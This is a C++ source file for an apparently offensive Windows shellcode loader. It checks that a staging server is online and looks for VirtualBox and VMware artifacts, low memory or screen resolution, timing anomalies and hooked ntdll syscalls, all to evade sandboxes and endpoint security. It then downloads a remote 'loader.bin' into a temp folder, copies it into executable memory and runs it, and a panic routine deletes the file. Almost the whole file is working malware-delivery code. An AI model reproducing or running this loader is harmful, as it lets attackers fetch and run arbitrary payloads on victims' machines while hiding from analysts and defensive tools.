#include <windows.h>
#include <iostream>
#include <fstream>
#include <winhttp.h>
#include <vector>
#include <string>
#include <set> 
#include <wininet.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "wininet.lib")

bool IsHookedFunction(PVOID functionAddress)
{
    // Syscall stubs start with these bytes in ntdll
    unsigned char syscallPrologue[4] = { 0x4c, 0x8b, 0xd1, 0xb8 };

    // Check if the first few bytes match the expected prologue
    if (memcmp(functionAddress, syscallPrologue, sizeof(syscallPrologue)) == 0) {
        return false; 
    }

    // If it's a JMP instruction, likely a hook
    if (*(unsigned char*)functionAddress == 0xE9 || *(unsigned char*)functionAddress == 0xE8) {
        return true; 
    }

    return true; 
}

bool isSyscallHooked() {
    bool syscallHooked = false;

    // List of functions to be ignored during verification
    std::set<std::string> ignoreList = {
        "NtGetTickCount",
        "NtQuerySystemTime",
        "NtdllDefWindowProc_A",
        "NtdllDefWindowProc_W",
        "NtdllDialogWndProc_A",
        "ZwQuerySystemTime",
        "NtdllDialogWndProc_W"
    };

    // Get ntdll base address
    HMODULE libraryBase = LoadLibraryA("ntdll");
    if (!libraryBase) {
        std::cerr << "Failed load ntdll.dll\n";
        return true; 
    }

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase;
    PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader->e_lfanew);

    // Locate export address table
    DWORD_PTR exportDirectoryRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA);

    // Offsets to list of exported functions and their names
    PDWORD addressOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfFunctions);
    PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNames);
    PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNameOrdinals);

    // Iterate through exported functions of ntdll
    for (DWORD i = 0; i < imageExportDirectory->NumberOfNames; i++) {
        // Resolve exported function name
        DWORD functionNameRVA = addressOfNamesRVA[i];
        DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA;
        char* functionName = (char*)functionNameVA;

        // Resolve exported function address
        DWORD_PTR functionAddressRVA = addressOfFunctionsRVA[addressOfNameOrdinalsRVA[i]];
        PVOID functionAddress = (PVOID)((DWORD_PTR)libraryBase + functionAddressRVA);

        // Ignore functions in the exception list
        if (ignoreList.find(functionName) != ignoreList.end()) {
            printf("Ignoring function: %s\n", functionName);
            continue;
        }

        // Only interested in Nt|Zw functions
        if (strncmp(functionName, "Nt", 2) == 0 || strncmp(functionName, "Zw", 2) == 0) {
            if (IsHookedFunction(functionAddress)) {
                printf("Hooked or modified: %s : %p\n", functionName, functionAddress);
                syscallHooked = true; // Mark as hooked if any function is modified
            }
            else {
                printf("Not hooked: %s : %p\n", functionName, functionAddress);
            }
        }
    }


    return syscallHooked;
}

bool isDomainOnline(const wchar_t* domain) {
    HINTERNET hSession = WinHttpOpen(L"ShellcodeRunner", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, domain, INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return false;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"HEAD", NULL, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    bool online = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) && WinHttpReceiveResponse(hRequest, NULL);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return online;
}

bool downloadShellcode(const wchar_t* domain, const wchar_t* path, const wchar_t* outputFilePath) {
    HINTERNET hSession = WinHttpOpen(L"ShellcodeDownloader", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, domain, INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return false;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    bool success = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) && WinHttpReceiveResponse(hRequest, NULL);
    if (!success) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    DWORD bytesRead;
    BYTE buffer[8192];
    HANDLE hFile = CreateFile(outputFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    do {
        if (!WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead)) {
            CloseHandle(hFile);
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }

        DWORD bytesWritten;
        WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);
    } while (bytesRead > 0);

    CloseHandle(hFile);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return true;
}

bool CheckRegistryKey(const std::wstring& key) {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, key.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }
    return false;
}

bool CheckFileExists(const std::wstring& filePath) {
    DWORD fileAttr = GetFileAttributesW(filePath.c_str());
    return (fileAttr != INVALID_FILE_ATTRIBUTES && !(fileAttr & FILE_ATTRIBUTE_DIRECTORY));
}

bool DetectVMArtifacts() {
    // Registry keys to check
    std::vector<std::wstring> registryKeys = {
        L"HARDWARE\\ACPI\\DSDT\\VBOX__",
        L"HARDWARE\\ACPI\\FADT\\VBOX__",
        L"HARDWARE\\ACPI\\RSDT\\VBOX__",
        L"SOFTWARE\\Oracle\\VirtualBox Guest Additions",
        L"SYSTEM\\ControlSet001\\Services\\VBoxGuest",
        L"SYSTEM\\ControlSet001\\Services\\VBoxMouse",
        L"SYSTEM\\ControlSet001\\Services\\VBoxService",
        L"SYSTEM\\ControlSet001\\Services\\VBoxSF",
        L"SYSTEM\\ControlSet001\\Services\\VBoxVideo",
        L"SOFTWARE\\VMware, Inc.\\VMware Tools",
        L"SOFTWARE\\Wine",
        L"SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters"
    };

    // Files to check
    std::vector<std::wstring> filesToCheck = {
        L"C:\\Windows\\system32\\drivers\\VBoxMouse.sys",
        L"C:\\Windows\\system32\\drivers\\VBoxGuest.sys",
        L"C:\\Windows\\system32\\drivers\\VBoxSF.sys",
        L"C:\\Windows\\system32\\drivers\\VBoxVideo.sys",
        L"C:\\Windows\\system32\\vboxdisp.dll",
        L"C:\\Windows\\system32\\vboxhook.dll",
        L"C:\\Windows\\system32\\vboxmrxnp.dll",
        L"C:\\Windows\\system32\\vboxogl.dll",
        L"C:\\Windows\\system32\\vboxoglarrayspu.dll",
        L"C:\\Windows\\system32\\VBoxService.exe",
        L"C:\\Windows\\system32\\VBoxTray.exe",
        L"C:\\Windows\\system32\\VBoxControl.exe",
        L"C:\\Windows\\system32\\drivers\\vmmouse.sys",
        L"C:\\Windows\\system32\\drivers\\vmhgfs.sys",
        L"C:\\Windows\\system32\\drivers\\vmmemctl.sys"
    };

    // Check registry keys
    for (const auto& key : registryKeys) {
        if (CheckRegistryKey(key)) {
            std::wcout << L"Detected VM artifact in registry: " << key << std::endl;
            return true;
        }
    }

    // Check file existence
    for (const auto& file : filesToCheck) {
        if (CheckFileExists(file)) {
            std::wcout << L"Detected VM artifact in file: " << file << std::endl;
            return true;
        }
    }

    return false;
}

bool DetectSandboxEnvironment() {
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    if (!GlobalMemoryStatusEx(&memInfo)) {
        std::cerr << "Failed to retrieve memory information" << std::endl;
        return true; // Fail-safe: assume sandbox
    }

    // Check RAM size (e.g., < 4 GB may indicate a sandbox)
    if (memInfo.ullTotalPhys < (4ULL * 1024 * 1024 * 1024)) {
        std::cout << "Detected low memory environment: " << (memInfo.ullTotalPhys / (1024 * 1024)) << " MB" << std::endl;
        return true;
    }

    // Check screen resolution
    DEVMODE devMode = { 0 };
    devMode.dmSize = sizeof(DEVMODE);
    if (EnumDisplaySettings(NULL, ENUM_CURRENT_SETTINGS, &devMode)) {
        if (devMode.dmPelsWidth <= 1024 && devMode.dmPelsHeight <= 768) {
            std::cout << "Detected low screen resolution: " << devMode.dmPelsWidth << "x" << devMode.dmPelsHeight << std::endl;
            return true;
        }
    }
    else {
        std::cerr << "Failed to retrieve display settings" << std::endl;
    }

    return false;
}

bool DetectPerform() {
    LARGE_INTEGER frequency, start, end;
    QueryPerformanceFrequency(&frequency);
    QueryPerformanceCounter(&start);
    Sleep(500); 
    QueryPerformanceCounter(&end);
    double elapsedTime = (double)(end.QuadPart - start.QuadPart) / frequency.QuadPart;

    if (elapsedTime > 0.6) { // Expecting around 0.5 seconds
        std::cerr << "Performance issues detected\n";
        return true;
    }
    return false;
}


bool DetectInternetConnection() {
    DWORD flags;
    if (!InternetGetConnectedState(&flags, 0)) {
        std::cerr << "No internet connection detected!\n";
        return true;
    }

    return false;
}

void PanicSwitch() {
    std::cerr << "Panic switch activated! Destroying artifacts...\n";

    // Delete temporary files
    DeleteFile(L"C:\\Windows\\Temp\\shellcode.bin");

    // Terminate current process
    ExitProcess(1);
}

int main() {
    const wchar_t* domain = L"192.168.15.47"; // Replace with the real domain
    const wchar_t* path = L"/loader.bin";
    const wchar_t* outputFilePath = L"C:\\Windows\\Temp\\shellcode.bin";

    // Kill-switch: Check if the domain is online
    if (!isDomainOnline(domain)) {
        std::cerr << "Domain offline\n";
        PanicSwitch();
        return 1;
    }

    // Detect VM
    if (DetectVMArtifacts()) {
        std::cerr << "VM artifacts detected. Exiting...\n";
        PanicSwitch();
        return 1;
    }

    // Detect Sandbox
    if (DetectSandboxEnvironment()) {
        std::cerr << "Sandbox environment detected. Exiting...\n";
        PanicSwitch();
        return 1;
    }

    std::cout << "No VM or sandbox detected. Proceeding...\n";


    // Kill-switch: Detect syscall hooks
    if (isSyscallHooked()) {
        std::cerr << "Syscall hooks detected\n";
        PanicSwitch();
        return 1;
    }

    if (DetectPerform()) {
        std::cerr << "Peformance Issues detected\n";
        PanicSwitch();
        return 1;
    }

    // Download the shellcode
    if (!downloadShellcode(domain, path, outputFilePath)) {
        std::cerr << "Failed to download the shellcode\n";
        PanicSwitch();
        return 1;
    }

    if (DetectInternetConnection()) {
        std::cerr << "No Connection Detected\n";
        PanicSwitch();
        return 1;
    }

    // Read the shellcode from the downloaded file
    std::ifstream file(outputFilePath, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        std::cerr << "Failed to open the shellcode file\n";
        PanicSwitch();
        return 1;
    }

    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);

    std::vector<char> buffer(size);
    if (!file.read(buffer.data(), size)) {
        std::cerr << "Failed to read the shellcode\n";
        return 1;
    }

    // Allocate executable memory
    void* execMemory = VirtualAlloc(nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!execMemory) {
        std::cerr << "Failed to allocate memory\n";
        return 1;
    }

    // Copy the shellcode into the allocated memory
    memcpy(execMemory, buffer.data(), size);

    // Change memory protection to executable
    DWORD oldProtect;
    if (!VirtualProtect(execMemory, size, PAGE_EXECUTE_READ, &oldProtect)) {
        std::cerr << "Failed to change memory protection\n";
        VirtualFree(execMemory, 0, MEM_RELEASE);
        return 1;
    }

    // Execute the shellcode
    auto shellcodeFunc = reinterpret_cast<void(*)()>(execMemory);
    shellcodeFunc();

    // Clean up memory
    VirtualFree(execMemory, 0, MEM_RELEASE);

    return 0;
}
